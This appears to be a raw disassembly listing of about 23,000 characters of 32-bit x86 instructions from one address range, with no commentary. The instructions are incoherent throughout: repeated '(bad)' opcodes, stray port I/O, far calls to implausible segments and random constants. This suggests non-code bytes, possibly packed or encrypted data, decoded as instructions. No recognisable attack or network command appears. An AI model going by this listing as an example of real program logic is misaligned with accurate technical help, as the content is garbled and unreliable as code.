  415ee0:	mov    edx,0x90db8b0
  415ee5:	daa    
  415ee6:	jns    0x415ea4
  415ee8:	in     al,0xde
  415eea:	and    cl,al
  415eec:	fimul  DWORD PTR [edx+0xeb614e3]
  415ef2:	dec    edi
  415ef3:	(bad)  
  415ef4:	fisttp WORD PTR ds:0x62b07132
  415efa:	std    
  415efb:	call   0x35fcf10e
  415f00:	out    dx,al
  415f01:	push   0x54d9c322
  415f06:	push   esp
  415f07:	push   0x72
  415f09:	jns    0x415f62
  415f0b:	xor    al,0x4e
  415f0d:	je     0x415edc
  415f0f:	sbb    al,bh
  415f11:	gs pop ds
  415f13:	stc    
  415f14:	dec    edi
  415f15:	xchg   ebp,eax
  415f16:	dec    eax
  415f17:	mov    BYTE PTR [ebp-0x65],ch
  415f1a:	rcr    BYTE PTR [eax],cl
  415f1c:	lea    ebp,[ecx-0x74]
  415f1f:	div    DWORD PTR [ebx]
  415f21:	xor    bh,BYTE PTR [ecx-0xa]
  415f24:	out    dx,eax
  415f25:	in     eax,dx
  415f26:	mov    DWORD PTR [esi-0x1fda827d],ecx
  415f2c:	dec    esp
  415f2d:	inc    DWORD PTR [edi]
  415f2f:	cmp    BYTE PTR [esi+0x12],0x92
  415f33:	lods   eax,DWORD PTR ds:[esi]
  415f34:	or     dl,dh
  415f36:	xchg   ecx,eax
  415f37:	fstp   TBYTE PTR [esi-0x16]
  415f3a:	js     0x415f18
  415f3c:	ss pop ebx
  415f3e:	or     BYTE PTR [ecx+0x4e],bh
  415f41:	mov    al,0x33
  415f43:	ret    
  415f44:	mov    bl,0x52
  415f46:	cmp    eax,0xa483181f
  415f4b:	jo     0x415ee3
  415f4d:	add    BYTE PTR [esi-0x32],ch
  415f50:	xor    eax,0xffea45e8
  415f55:	xchg   DWORD PTR [edi-0x2f],edx
  415f58:	mov    edi,0x6b88278c
  415f5d:	mov    al,ds:0x29e9aad8
  415f62:	loop   0x415f66
  415f64:	aas    
  415f65:	aaa    
  415f66:	xor    BYTE PTR [edx],dh
  415f68:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415f69:	cli    
  415f6a:	push   ebx
  415f6b:	xchg   DWORD PTR [ebx-0x32756cff],eax
  415f71:	push   eax
  415f73:	pop    ecx
  415f74:	jecxz  0x415f22
  415f76:	loop   0x415f80
  415f78:	dec    edx
  415f79:	pusha  
  415f7a:	add    eax,0xed6698db
  415f7f:	adc    al,dh
  415f81:	push   edx
  415f82:	arpl   WORD PTR [edx+ebx*8-0x70066308],dx
  415f89:	loop   0x416006
  415f8b:	jge    0x415f8e
  415f8d:	clc    
  415f8e:	shl    DWORD PTR [esi+0x29be88e6],0xc6
  415f95:	jmp    0x415f34
  415f97:	jb     0x415ffe
  415f99:	dec    esi
  415f9a:	test   al,0x23
  415f9c:	jl     0x415f99
  415f9e:	adc    ch,BYTE PTR ds:0x253a96e5
  415fa4:	popf   
  415fa5:	int3   
  415fa6:	stc    
  415fa7:	in     al,dx
  415fa8:	lock out dx,al
  415faa:	mov    al,0x61
  415fac:	dec    ebx
  415fad:	inc    edi
  415fae:	test   esi,0x6e9ab6f2
  415fb4:	ja     0x416029
  415fb6:	test   al,0xf5
  415fb8:	adc    bh,BYTE PTR [edx]
  415fba:	and    edx,DWORD PTR ds:0x7d9b6072
  415fc0:	in     al,dx
  415fc1:	rol    BYTE PTR [ebx+0x4d5705f5],cl
  415fc7:	pop    ebp
  415fc8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415fc9:	cmp    BYTE PTR [eax+0x11467457],dl
  415fcf:	mov    ecx,0xf0359599
  415fd4:	ja     0x415f68
  415fd6:	sti    
  415fd7:	pop    ebx
  415fd8:	dec    esi
  415fd9:	pop    ds
  415fda:	sub    esp,edx
  415fdc:	int3   
  415fdd:	mov    cl,BYTE PTR [ecx+eiz*8-0x19]
  415fe1:	lods   eax,DWORD PTR ds:[esi]
  415fe2:	pop    ecx
  415fe3:	pop    ebx
  415fe4:	add    DWORD PTR [ebx],ecx
  415fe6:	mov    esi,0xd0d968ac
  415feb:	test   DWORD PTR [ebx+0x57],0xcb9b0ecd
  415ff2:	call   0x6959:0xf6db289d
  415ff9:	fstp   QWORD PTR [eax+0x56]
  415ffc:	sub    bh,BYTE PTR [eax+0x7d101284]
  416002:	ret    
  416003:	dec    eax
  416004:	xor    bh,0xae
  416007:	fmul   DWORD PTR [esi+0x44]
  41600a:	fldenv [ebx]
  41600c:	(bad)  
  41600e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41600f:	ins    BYTE PTR es:[edi],dx
  416010:	pusha  
  416011:	adc    eax,0x6bea62df
  416016:	xchg   ebx,eax
  416017:	test   eax,0xacbe06c5
  41601c:	sahf   
  41601d:	add    al,0x8f
  41601f:	cwde   
  416020:	sbb    al,bl
  416022:	and    eax,DWORD PTR [esi+0x52]
  416025:	cld    
  416026:	mov    ah,0x91
  416028:	pop    ecx
  416029:	retf   0xf9a8
  41602c:	add    DWORD PTR [edx+edi*1+0x1],ecx
  416030:	push   0x302c88d0
  416035:	stos   DWORD PTR es:[edi],eax
  416036:	mov    ebx,0xce0507f7
  41603b:	test   BYTE PTR ds:0x166c3d6f,0xef
  416042:	test   DWORD PTR [edx+0x4b0f1625],eax
  416048:	(bad)
  41604c:	push   ds
  41604d:	xchg   esi,eax
  41604e:	(bad)  
  41604f:	in     eax,0x75
  416051:	mov    eax,ds:0x871d08f1
  416056:	and    ebp,eax
  416058:	push   ebp
  416059:	and    ecx,DWORD PTR [ecx]
  41605b:	pop    ebx
  41605c:	mov    esp,0x95e0d3d3
  416061:	stc    
  416062:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416063:	mov    ch,0xc9
  416065:	cwde   
  416066:	aam    0xe5
  416068:	les    esp,FWORD PTR ds:0x9a749b7f
  41606e:	std    
  41606f:	and    DWORD PTR [eax],esp
  416071:	xlat   BYTE PTR ds:[ebx]
  416072:	mov    ah,0x6e
  416074:	fidiv  DWORD PTR [ebp-0x1f07bccc]
  41607a:	sbb    bl,ch
  41607c:	mov    al,ds:0x634a5a26
  416081:	cmp    dh,BYTE PTR [ecx+0x47f446f7]
  416087:	pop    ss
  416088:	std    
  416089:	jns    0x416053
  41608b:	cmp    BYTE PTR [ebp+ecx*1-0x2940befc],dl
  416092:	pop    ebp
  416093:	lea    edi,[edx+edx*2-0x50]
  416097:	mov    cl,0x9b
  416099:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41609a:	mov    WORD PTR [ebp+0x68],cs
  41609d:	into   
  41609e:	jae    0x41604f
  4160a0:	mov    eax,ds:0x782a1400
  4160a5:	fsubr  st(3),st
  4160a7:	and    esp,DWORD PTR [ebp-0x3d]
  4160aa:	icebp  
  4160ab:	arpl   WORD PTR [ebx],si
  4160ad:	mov    ecx,0xc93a4b17
  4160b2:	jle    0x4160a5
  4160b4:	push   edx
  4160b6:	sbb    bh,BYTE PTR ds:0x8d63fe03
  4160bc:	inc    edi
  4160bd:	sub    eax,0xef16e672
  4160c2:	and    BYTE PTR [ebx+0x3],al
  4160c5:	jo     0x416119
  4160c7:	ins    DWORD PTR es:[edi],dx
  4160c8:	sub    al,0x1
  4160ca:	pop    ebx
  4160cb:	dec    edx
  4160cc:	pushf  
  4160cd:	movntps XMMWORD PTR [ebx+0x2e],xmm4
  4160d1:	mov    ebx,0xbb1e0737
  4160d6:	jae    0x416085
  4160d8:	ds pop edi
  4160da:	in     eax,dx
  4160db:	das    
  4160dc:	int3   
  4160dd:	xchg   BYTE PTR [eax+0x34c969ad],ah
  4160e3:	(bad)  
  4160e5:	fstp   TBYTE PTR [ecx-0x6e5162ea]
  4160eb:	mov    bl,0x70
  4160ed:	out    dx,al
  4160ee:	shl    BYTE PTR [eax+edx*8+0x46],0x32
  4160f3:	pop    ss
  4160f4:	cmp    BYTE PTR [eax],al
  4160f6:	ds das 
  4160f8:	mov    DWORD PTR [esi],0xc71bef8b
  4160fe:	cmp    eax,0x42cf1709
  416103:	xor    dh,bl
  416105:	xchg   ebp,eax
  416106:	push   0xffffffd3
  416108:	fadd   st(1),st
  41610a:	retf   0xe4ff
  41610d:	call   0x76ba:0x97557052
  416114:	fild   WORD PTR [ebx+0x37e357ed]
  41611a:	test   ebx,0xa9fc850a
  416120:	and    BYTE PTR [edx-0x54],0x87
  416124:	dec    BYTE PTR [esi-0x781be143]
  41612a:	xchg   BYTE PTR [eax+ebx*4],ah
  41612d:	cwde   
  41612e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41612f:	xor    cl,bl
  416131:	jns    0x4160d4
  416133:	dec    eax
  416134:	imul   ecx,DWORD PTR [ebp-0x4bad1e69],0xffffffa6
  41613b:	fidivr WORD PTR [ecx-0x7d]
  41613e:	stos   DWORD PTR es:[edi],eax
  41613f:	sub    al,0xd3
  416141:	cmp    DWORD PTR [ebx-0x4],ebx
  416144:	nop
  416145:	cmp    BYTE PTR [esi],0x17
  416148:	sub    eax,0x7631060d
  41614d:	cld    
  41614e:	xchg   DWORD PTR [edx],esp
  416150:	jbe    0x416137
  416152:	test   BYTE PTR [edx+ebx*4+0x23],dh
  416156:	jl     0x416186
  416158:	cmp    BYTE PTR [ecx+0x2d],0xd3
  41615c:	sub    eax,0x8950cec1
  416161:	jno    0x41616c
  416163:	inc    ebp
  416164:	mov    dl,0x1b
  416166:	push   ds
  416167:	pop    edi
  416168:	ret    0xc61f
  41616b:	push   cs
  41616c:	mov    ecx,0x6a259380
  416171:	pop    edx
  416172:	test   eax,0x9eb1d2c7
  416177:	jecxz  0x4161ba
  416179:	out    dx,eax
  41617a:	jl     0x416137
  41617c:	test   eax,0x671d3657
  416181:	pop    es
  416182:	mov    es,WORD PTR [eax+0x75]
  416185:	cmp    eax,0x8aa1b60e
  41618a:	fbld   TBYTE PTR ds:0xbea83141
  416190:	mov    cl,0x2e
  416192:	mov    cs,WORD PTR [ebx]
  416194:	scas   eax,DWORD PTR es:[edi]
  416195:	fadd   QWORD PTR [ebx-0x21c9abc2]
  41619b:	fidiv  DWORD PTR [ecx-0x7f91849e]
  4161a1:	sub    ecx,ebx
  4161a3:	dec    ebp
  4161a4:	fcmovnb st,st(1)
  4161a6:	ret    0x1bab
  4161a9:	in     al,dx
  4161aa:	jl     0x416163
  4161ac:	or     BYTE PTR [eax+0x639ba42a],bl
  4161b2:	pusha  
  4161b3:	mov    esi,0x42740c33
  4161b8:	fist   WORD PTR [esi-0x5c9cf70b]
  4161be:	outs   dx,DWORD PTR ds:[esi]
  4161bf:	adc    edi,DWORD PTR [eax]
  4161c1:	xchg   ebp,eax
  4161c2:	pop    ebx
  4161c3:	aad    0xfe
  4161c5:	jmp    0xcfc68d4a
  4161ca:	scas   al,BYTE PTR es:[edi]
  4161cb:	in     eax,0x56
  4161cd:	jle    0x4161bf
  4161cf:	jp     0x416241
  4161d1:	pop    ebp
  4161d2:	xchg   ebx,eax
  4161d3:	pop    ecx
  4161d4:	pop    esi
  4161d5:	sub    eax,0x9eb4bd1d
  4161da:	adc    BYTE PTR [edi],ch
  4161dc:	lea    eax,[ebx]
  4161de:	or     DWORD PTR [eax+0xe],esp
  4161e1:	sub    esi,DWORD PTR [esi+0x4f]
  4161e4:	nop
  4161e5:	rol    BYTE PTR [eax],cl
  4161e7:	and    al,0x7b
  4161e9:	jbe    0x416251
  4161eb:	data16 cli 
  4161ed:	mov    eax,0x854c0
  4161f2:	mov    BYTE PTR [edi+0x78],bh
  4161f5:	add    al,BYTE PTR [ebp+0x60]
  4161f8:	xor    ebp,ebx
  4161fa:	mov    ebx,0xb3f23eef
  4161ff:	sub    al,al
  416201:	pushf  
  416202:	aaa    
  416203:	and    BYTE PTR [ebp-0x4b422c8],0x83
  41620a:	pop    esi
  41620b:	mov    bh,0x65
  41620d:	fs fcom st(6)
  416210:	mov    edi,0x9bb32f65
  416215:	cmp    al,0xec
  416217:	leave  
  416218:	bnd jl 0x416271
  41621b:	mov    DWORD PTR [ebx+0x7495e4aa],ebx
  416221:	or     esi,0xffffffb4
  416224:	sub    al,0x2a
  416226:	imul   ebp,DWORD PTR [ecx-0x10a57558],0xffffffb1
  41622d:	push   ebp
  41622e:	inc    ecx
  41622f:	pop    ecx
  416230:	mov    al,0xdc
  416232:	(bad)  
  416234:	ror    DWORD PTR ds:0x2a180560,cl
  41623a:	imul   ebx
  41623c:	sbb    BYTE PTR [esi+0x33],cl
  41623f:	leave  
  416240:	mov    ch,0xfd
  416242:	scas   eax,DWORD PTR es:[edi]
  416243:	cmp    bh,BYTE PTR [ecx+0x77]
  416246:	push   edi
  416247:	int3   
  416248:	or     bh,bl
  41624a:	xchg   edx,eax
  41624b:	pop    es
  41624c:	jmp    0xdaaf:0xc0378c2b
  416253:	cmp    eax,DWORD PTR [edx]
  416255:	std    
  416256:	pop    ebp
  416257:	clc    
  416258:	dec    esp
  416259:	mov    ebx,0xf8b72b92
  41625e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41625f:	fnstsw WORD PTR ds:0x7830ae98
  416265:	sbb    esp,DWORD PTR [ecx]
  416267:	dec    ebx
  416268:	cmp    eax,0x1aa47720
  41626d:	jbe    0x416214
  41626f:	jg     0x41629a
  416271:	fidiv  DWORD PTR [ebp+0x2e2fa4bb]
  416277:	popf   
  416278:	fcom   QWORD PTR cs:[edi]
  41627b:	pop    ecx
  41627c:	push   esi
  41627d:	test   eax,0xf077aa41
  416282:	push   0x61
  416284:	jle    0x416223
  416286:	mov    WORD PTR [eax-0x2d],gs
  416289:	jns    0x4162e7
  41628b:	sbb    eax,0xfc8b8b80
  416290:	pop    eax
  416291:	inc    ebp
  416292:	or     DWORD PTR [eax-0x1d05728c],edi
  416298:	mov    ds:0xef7400b0,al
  41629d:	call   0xe4b6:0x7d43
  4162a3:	ins    BYTE PTR es:[edi],dx
  4162a4:	inc    edi
  4162a5:	pop    esp
  4162a6:	cs test dl,cl
  4162a9:	sbb    bl,BYTE PTR [ebx-0x3fcb4f29]
  4162af:	adc    ah,BYTE PTR [edi+edx*4+0x34]
  4162b3:	or     DWORD PTR [esi],edx
  4162b5:	sti    
  4162b6:	pop    edx
  4162b7:	outs   dx,BYTE PTR ds:[esi]
  4162b8:	push   ss
  4162b9:	dec    ecx
  4162ba:	dec    esi
  4162bb:	mov    ebx,0x81140c4c
  4162c0:	jae    0x416289
  4162c2:	outs   dx,BYTE PTR ds:[esi]
  4162c3:	sbb    eax,0xf7d9a86c
  4162c8:	sbb    ecx,DWORD PTR [esi+0x14]
  4162cb:	and    esp,DWORD PTR [esi+eiz*4]
  4162ce:	jne    0x416316
  4162d0:	sti    
  4162d1:	ins    DWORD PTR es:[edi],dx
  4162d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4162d3:	or     al,BYTE PTR [edx+0xd]
  4162d6:	mov    bh,0x61
  4162d8:	jae    0x416332
  4162da:	push   cs
  4162db:	xchg   ebx,eax
  4162dc:	inc    eax
  4162dd:	push   edi
  4162de:	repz into 
  4162e0:	cmp    BYTE PTR [ebp-0x6dde35fa],bh
  4162e6:	mov    eax,0x273906e7
  4162eb:	loope  0x41633b
  4162ed:	popf   
  4162ee:	or     DWORD PTR [ebp+0x30],esp
  4162f1:	les    esi,FWORD PTR [ebx-0x42]
  4162f4:	dec    edx
  4162f5:	icebp  
  4162f6:	dec    esp
  4162f7:	dec    edi
  4162f8:	mov    eax,0x829553c0
  4162fd:	cmp    DWORD PTR [ecx],0x55
  416300:	fsubr  DWORD PTR [ecx-0xc]
  416303:	dec    ecx
  416304:	cmc    
  416305:	mov    dh,0xa
  416307:	loope  0x416384
  416309:	retf   
  41630a:	cmp    eax,0xd2aa1487
  41630f:	add    al,0x86
  416311:	les    ebp,FWORD PTR [eax]
  416313:	jl     0x41636d
  416315:	ja     0x416316
  416317:	dec    ebx
  416318:	or     edi,DWORD PTR [esi+esi*1+0x38]
  41631c:	iret   
  41631d:	iret   
  41631e:	fdivr  st,st(4)
  416320:	dec    ecx
  416321:	jne    0x41636e
  416323:	inc    edi
  416324:	(bad)  
  416325:	xchg   BYTE PTR gs:[edi],cl
  416328:	add    ch,bl
  41632a:	test   DWORD PTR [ebx+0x5bd4be54],0xa7d2c806
  416334:	mov    esp,0xfd5661fd
  416339:	ins    BYTE PTR es:[edi],dx
  41633a:	(bad)  
  41633d:	popa   
  41633e:	jg     0x416316
  416340:	inc    esp
  416341:	fmulp  st(4),st
  416343:	xchg   edi,eax
  416344:	cmc    
  416345:	and    DWORD PTR [ebp-0x6f],0xffffffb5
  416349:	cld    
  41634a:	in     eax,dx
  41634b:	leave  
  41634c:	ja     0x4162e1
  41634e:	xchg   BYTE PTR [eax],dh
  416350:	jbe    0x41632e
  416352:	push   0xffffffc4
  416354:	or     dl,BYTE PTR [eax+0x2e]
  416357:	mov    eax,0x1401f6e
  41635c:	in     al,dx
  41635d:	enter  0xe0cc,0x14
  416361:	cmp    eax,0x52f74fe4
  416366:	or     DWORD PTR [ecx+0x1261721f],esi
  41636c:	into   
  41636d:	das    
  41636e:	sahf   
  41636f:	mov    esi,0xc3b42ffb
  416374:	adc    al,0xd8
  416376:	xlat   BYTE PTR ds:[ebx]
  416377:	jo     0x416390
  416379:	dec    ecx
  41637a:	push   esi
  41637b:	mov    bh,0xb1
  41637d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41637e:	icebp  
  41637f:	pop    ebp
  416380:	ror    DWORD PTR [ebp-0x5b79cb9d],cl
  416386:	mov    BYTE PTR [edi-0x61ba6dc0],dl
  41638c:	test   eax,0xc68cc3a1
  416391:	push   esi
  416392:	in     eax,0x47
  416394:	push   eax
  416395:	into   
  416396:	push   ds
  416397:	cmp    al,0x27
  416399:	add    al,BYTE PTR [eax+0x5a]
  41639c:	rcr    DWORD PTR [edi],cl
  41639e:	add    eax,0xaae8c654
  4163a3:	sbb    bl,BYTE PTR [eax]
  4163a5:	ja     0x416346
  4163a7:	add    BYTE PTR [ecx-0x6538d4f5],ah
  4163ad:	push   ds
  4163ae:	adc    ch,ah
  4163b0:	std    
  4163b1:	pop    ss
  4163b2:	sbb    BYTE PTR [edi+eax*4+0x33],0xee
  4163b7:	test   eax,0xd2c0626e
  4163bc:	sbb    ebx,DWORD PTR [ecx+edx*4-0x3c463e52]
  4163c3:	mov    ah,0x2c
  4163c5:	adc    eax,0x7dceafcf
  4163ca:	loop   0x4163a2
  4163cc:	mov    es,WORD PTR [ecx+0x7f]
  4163cf:	mov    edx,0x535784ff
  4163d4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4163d5:	sbb    BYTE PTR [edi],dl
  4163d7:	or     al,0x80
  4163d9:	or     eax,0x6eb7f509
  4163de:	xchg   ecx,eax
  4163df:	or     bh,BYTE PTR [esi]
  4163e1:	add    bh,BYTE PTR [esi+esi*4]
  4163e4:	test   dl,bl
  4163e6:	dec    esp
  4163e7:	sub    BYTE PTR [edi+0x29],ch
  4163ea:	jecxz  0x4163f1
  4163ec:	mov    es,WORD PTR [eax-0x1646f204]
  4163f2:	outs   dx,BYTE PTR ds:[esi]
  4163f3:	xchg   edx,eax
  4163f4:	dec    esi
  4163f5:	sub    ecx,ebx
  4163f7:	stc    
  4163f8:	adc    eax,0x29fa1519
  4163fd:	cli    
  4163fe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4163ff:	leave  
  416400:	xchg   BYTE PTR [ecx-0x15],dh
  416403:	imul   esi,DWORD PTR [esi+0x10e850e6],0x3e97cb91
  41640d:	aas    
  41640e:	popf   
  41640f:	xor    eax,0xdb7a1ada
  416414:	loop   0x4163be
  416416:	cli    
  416417:	shl    DWORD PTR [eax-0x1519df73],1
  41641d:	sub    dh,BYTE PTR [edi]
  41641f:	push   eax
  416420:	lds    edi,FWORD PTR ds:0x94ed6792
  416426:	das    
  416427:	das    
  416428:	push   ebx
  416429:	jmp    0x4163f4
  41642b:	inc    ecx
  41642c:	stc    
  41642d:	aad    0x81
  41642f:	mov    eax,0x31090436
  416434:	push   0x44
  416436:	xchg   ebp,eax
  416437:	out    0x3,al
  416439:	pop    ss
  41643a:	add    ebx,DWORD PTR [ebx]
  41643c:	mov    ds:0x429887e3,al
  416441:	pop    ds
  416442:	sub    eax,0x9bfca893
  416447:	jbe    0x416460
  416449:	int3   
  41644a:	outs   dx,BYTE PTR ds:[esi]
  41644b:	ror    DWORD PTR [esp+eax*2+0x2e],1
  41644f:	cli    
  416450:	cmp    edx,esi
  416452:	pop    eax
  416453:	les    esp,FWORD PTR [esi+ebx*8]
  416456:	push   edi
  416457:	in     eax,dx
  416458:	and    BYTE PTR [ecx],bh
  41645a:	bnd jnp 0x416441
  41645d:	div    DWORD PTR [ecx-0x7b091ea0]
  416463:	sar    BYTE PTR [edi+edx*8-0x7f9c4ea5],cl
  41646a:	mov    DWORD PTR ds:0x479146e8,esp
  416470:	sub    eax,0x6ad14858
  416475:	jb     0x41645b
  416477:	push   cs
  416478:	ret    0xc22b
  41647b:	or     DWORD PTR ds:0xe10df4c,ecx
  416481:	repnz hlt 
  416483:	sub    ebx,ebp
  416485:	fwait
  416486:	pop    ebp
  416487:	jnp    0x4164f6
  416489:	cmp    esp,DWORD PTR [eax]
  41648b:	test   ebp,ebp
  41648d:	cmc    
  41648e:	into   
  41648f:	mov    esp,ss
  416491:	fcomp  DWORD PTR [ebp+0x5e]
  416494:	in     eax,dx
  416495:	push   edx
  416496:	imul   ebp,DWORD PTR [eax+0x54dc7dda]
  41649d:	jne    0x41647f
  41649f:	and    al,0xb6
  4164a1:	aaa    
  4164a2:	imul   ecx,ebx,0xae1898e
  4164a8:	push   cs
  4164a9:	and    al,0x62
  4164ab:	shrd   DWORD PTR [edi-0x7aa96e71],ecx,0xc8
  4164b3:	scas   al,BYTE PTR es:[edi]
  4164b4:	aas    
  4164b5:	mov    ecx,0x86d9514
  4164ba:	mov    DWORD PTR [ecx-0x705eae45],edi
  4164c0:	enter  0x36ca,0x34
  4164c4:	inc    edx
  4164c5:	(bad)  
  4164c6:	imul   eax,edx,0x8417647a
  4164cc:	dec    esi
  4164cd:	mov    dl,0xf9
  4164cf:	pop    ebx
  4164d0:	rol    DWORD PTR [esi+0x12d42635],cl
  4164d6:	cmp    ecx,ebp
  4164d8:	in     al,dx
  4164d9:	cld    
  4164da:	sbb    eax,0xe42a4ef1
  4164df:	popf   
  4164e0:	cmp    esi,ebx
  4164e2:	add    DWORD PTR [esi],eax
  4164e4:	pop    es
  4164e5:	in     eax,dx
  4164e6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4164e7:	test   BYTE PTR [esi+0x14f4cf76],0xd
  4164ee:	in     eax,dx
  4164ef:	adc    al,0x8e
  4164f1:	or     DWORD PTR [edi+0x3f127a6f],ecx
  4164f7:	ds pop edi
  4164f9:	and    eax,0x5202ddd
  4164fe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4164ff:	push   0x65
  416501:	popa   
  416502:	loope  0x416523
  416504:	pop    ss
  416505:	cmp    DWORD PTR [edi-0xf],edi
  416508:	not    DWORD PTR [edx+0x37326cdf]
  41650e:	pop    es
  41650f:	fwait
  416510:	pop    edi
  416511:	jmp    0x4164f6
  416513:	and    al,0x42
  416515:	aam    0x4a
  416517:	daa    
  416518:	test   BYTE PTR ds:0xbff3cd74,al
  41651e:	in     al,dx
  41651f:	shl    BYTE PTR [edi],cl
  416521:	pop    ss
  416522:	sar    BYTE PTR [ebp+0x49],0x7b
  416526:	jb     0x4164e5
  416528:	adc    al,0xe7
  41652a:	icebp  
  41652b:	js     0x41650f
  41652d:	(bad)  
  41652e:	das    
  41652f:	fist   DWORD PTR [ecx]
  416531:	mov    dl,0x89
  416533:	cmp    dl,bl
  416535:	pop    ecx
  416536:	mov    ecx,0x2d5da7f
  41653b:	sbb    esp,DWORD PTR [edx+ebp*4+0x1c]
  41653f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416540:	in     al,0x96
  416542:	inc    edi
  416543:	jle    0x416516
  416545:	push   edi
  416546:	aas    
  416547:	push   ebx
  416548:	lea    eax,[ebp+0x4a]
  41654b:	add    BYTE PTR [esi+0x6dbee9e5],0x90
  416552:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416553:	adc    BYTE PTR [ebp+0x1e],al
  416556:	int3   
  416557:	or     al,0x97
  416559:	mov    ah,0x9e
  41655b:	push   ebx
  41655c:	out    dx,al
  41655d:	sbb    BYTE PTR [ebp+0x25],0xa3
  416561:	dec    edi
  416562:	(bad)  
  416563:	and    eax,0x19c11690
  416568:	les    edx,FWORD PTR [edi]
  41656a:	cmp    al,0xaf
  41656c:	lea    esi,ds:0x750e9c61
  416572:	outs   dx,BYTE PTR ds:[esi]
  416573:	push   esi
  416574:	fwait
  416575:	push   edi
  416576:	pop    edi
  416577:	xchg   ebp,eax
  416578:	mov    cl,0xcd
  41657a:	jbe    0x4165c4
  41657c:	sbb    al,0x6c
  41657e:	mov    edx,es
  416580:	push   ds
  416581:	repnz arpl WORD PTR [esi-0x499da8cc],dx
  416588:	push   cs
  416589:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41658a:	test   BYTE PTR [ebp+eiz*8+0x7],dh
  41658e:	mov    BYTE PTR cs:[eax+edx*8-0x6f],ah
  416593:	mov    ds:0x23340afa,eax
  416598:	ss repz or bl,ah
  41659c:	data16 test al,0x59
  41659f:	pop    ebx
  4165a0:	pop    ebx
  4165a1:	enter  0x9ce9,0xd3
  4165a5:	sahf   
  4165a6:	jo     0x41658d
  4165a8:	add    bh,ah
  4165aa:	xchg   edx,eax
  4165ab:	xor    al,0xc1
  4165ad:	or     eax,0x902e5274
  4165b2:	int3   
  4165b3:	out    0x2d,eax
  4165b5:	mov    edi,0x2c42ff77
  4165ba:	mov    al,ds:0x7789ef82
  4165bf:	jne    0x4165dd
  4165c1:	adc    al,0xea
  4165c3:	sub    DWORD PTR ss:[ecx+0x6],0x5af52d3e
  4165cb:	(bad)  
  4165cc:	popa   
  4165cd:	mov    cl,0x72
  4165cf:	out    0x81,al
  4165d1:	mov    dh,BYTE PTR [ebp+0x39]
  4165d4:	or     ebx,DWORD PTR [edx+0x57]
  4165d7:	adc    bl,BYTE PTR [esi+0x3025527e]
  4165dd:	dec    esp
  4165de:	pop    esi
  4165df:	repnz push ss
  4165e1:	xchg   BYTE PTR [ecx+0x35],ch
  4165e4:	push   eax
  4165e5:	push   0x58
  4165e7:	jno    0x416628
  4165e9:	mov    edx,eax
  4165eb:	push   edi
  4165ec:	xlat   BYTE PTR ds:[ebx]
  4165ed:	test   DWORD PTR [eax-0x30452787],eax
  4165f3:	xchg   esp,eax
  4165f4:	push   0x23
  4165f6:	mov    dl,0xf8
  4165f8:	push   ss
  4165f9:	jbe    0x41666c
  4165fb:	mov    ebx,0xe3bb3a34
  416600:	mov    ebp,0x17f63f5d
  416605:	dec    edx
  416606:	leave  
  416607:	and    BYTE PTR [esi+0x1de926c7],bl
  41660d:	sahf   
  41660e:	jno    0x416674
  416610:	lds    ebp,FWORD PTR [edi+0x4791d369]
  416616:	sahf   
  416617:	mov    cl,0x62
  416619:	shl    BYTE PTR [ebx],1
  41661b:	jno    0x41668c
  41661d:	xchg   ebx,eax
  41661e:	xchg   BYTE PTR [edx+0x1a],dl
  416621:	jno    0x4165af
  416623:	mov    bh,0xaa
  416625:	jmp    0x416618
  416627:	sub    eax,0xeaa804c0
  41662c:	scas   eax,DWORD PTR es:[edi]
  41662d:	test   eax,0xa2a50954
  416632:	in     eax,0x81
  416634:	xchg   edx,eax
  416635:	ja     0x4166b5
  416637:	lods   al,BYTE PTR ds:[esi]
  416638:	and    eax,0x97aa8418
  41663d:	push   0xd480ef22
  416642:	mov    eax,ds:0x497081b2
  416647:	ficom  WORD PTR [edi+0x48]
  41664a:	xchg   ecx,eax
  41664b:	jmp    0x480b2213
  416650:	push   ss
  416651:	cmp    esp,DWORD PTR [ebx]
  416653:	jo     0x4165fb
  416655:	(bad)  
  416657:	mov    bl,0x92
  416659:	dec    edi
  41665a:	lea    ebp,[esi+0x7]
  41665d:	popf   
  41665e:	imul   edi,DWORD PTR [ebp+ebp*8-0x59f2ad75],0x830af7df
  416669:	arpl   WORD PTR gs:[eax],cx
  41666c:	ins    DWORD PTR es:[edi],dx
  41666d:	xor    BYTE PTR [ecx+0x153a2b5a],dh
  416673:	imul   esp,DWORD PTR [edx],0xffffff85
  416676:	pop    ss
  416677:	popf   
  416678:	or     bh,BYTE PTR [ebx]
  41667a:	push   0x3225a305
  41667f:	xor    ah,ah
  416681:	inc    ecx
  416682:	ror    DWORD PTR [ecx+eax*4],1
  416685:	sub    bh,BYTE PTR [eax+0x79]
  416688:	xor    esp,DWORD PTR [ebx-0x794b504a]
  41668e:	call   0x32a72512
  416693:	and    al,0x5e
  416695:	addr16 mov ds:0x254e,al
  416699:	or     dl,BYTE PTR [ebp+esi*1+0x70]
  41669d:	adc    BYTE PTR [esi],0xe2
  4166a0:	pop    esi
  4166a1:	retf   
  4166a2:	xchg   edx,eax
  4166a3:	icebp  
  4166a4:	mov    ebx,0xd9377e6e
  4166a9:	imul   ebp,DWORD PTR [esi+edi*8-0x50],0xffffffac
  4166ae:	in     al,dx
  4166af:	push   ecx
  4166b0:	inc    ebx
  4166b1:	mov    ds:0x1ed0e647,eax
  4166b6:	mov    DWORD PTR [ebx],edx
  4166b8:	or     BYTE PTR [eax-0x41bd80b6],al
  4166be:	and    edi,DWORD PTR [esp+ebp*4+0x745ae871]
  4166c5:	retf   0xa3bc
  4166c8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4166c9:	call   0xa275:0xc93ea28d
